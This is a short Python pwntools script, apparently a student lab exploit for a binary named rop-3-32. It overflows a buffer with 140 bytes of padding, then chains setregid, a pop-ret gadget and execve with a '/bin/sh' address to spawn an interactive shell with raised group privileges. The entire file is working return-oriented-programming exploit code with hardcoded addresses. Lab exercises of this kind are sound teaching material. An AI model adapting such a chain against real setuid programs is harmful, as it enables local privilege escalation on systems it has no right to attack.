#!/usr/bin/env python
from pwn import *

offset = 140

setregid = p32(0xf7ed9e30)
execve = p32(0xf7e26200)
pop_ret = p32(0x0804868a)
sh_addr = p32(0xf7ff50dc)

buf = 'A' * offset
buf += setregid
buf += pop_ret
buf += p32(1045) * 2
buf += execve
buf += 'CCCC'
buf += sh_addr

p = process('/home/student/lab5/rop-3-32/rop-3-32')

with open('input.txt', 'w') as f:
    f.write(buf)

p.send(buf)
p.interactive()
